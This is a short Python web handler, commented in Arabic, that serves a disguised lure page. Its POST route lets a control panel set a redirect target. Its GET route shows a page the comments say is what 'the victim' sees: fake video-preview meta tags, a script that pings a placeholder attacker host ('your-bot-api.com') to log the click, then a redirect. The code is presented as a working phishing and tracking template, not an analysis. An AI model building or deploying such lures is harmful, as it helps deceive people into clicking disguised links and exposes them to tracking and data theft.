from http.server import BaseHTTPRequestHandler
import json

# قاعدة بيانات مؤقتة (سيتم تخزين الرابط هنا)
# ملاحظة: في Vercel يفضل استخدام قاعدة بيانات حقيقية، لكن للتبسيط سنعتمد الاستجابة المباشرة
db = {"url": "https://tiktok.com"}

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        # هذه الجزئية لاستقبال الرابط من لوحة التحكم
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data)
        db["url"] = data.get("targetUrl", "https://tiktok.com")
        
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps({"status": "success"}).encode())

    def do_GET(self):
        # هذه الجزئية هي ما يراه الضحية عند فتح الرابط
        target = db["url"]
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()
        
        # هنا التمويه: نضع Meta Tags تجعل الرابط يظهر كفيديو طبيعي في المعاينة
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Video Preview</title>
            <meta property="og:title" content="شاهد هذا المقطع">
            <meta property="og:description" content="مقطع فيديو مميز">
            <meta property="og:image" content="https://path-to-fake-thumbnail.jpg">
            <meta name="twitter:card" content="summary_large_image">
            <script>
                // هنا نضع كود التلغيم (سحب البيانات) قبل التحويل
                fetch('https://your-bot-api.com/log?info=victim_clicked'); 
                
                // التحويل إلى الرابط الذي وضعته في لوحة التحكم بعد ثانية واحدة
                setTimeout(() => {{
                    window.location.href = "{target}";
                }}, 1000);
            </script>
        </head>
        <body style="background: black;">
            <p style="color: white; text-align: center; margin-top: 20%;">جاري تحميل الفيديو...</p>
        </body>
        </html>
        """
        self.wfile.write(html.encode())
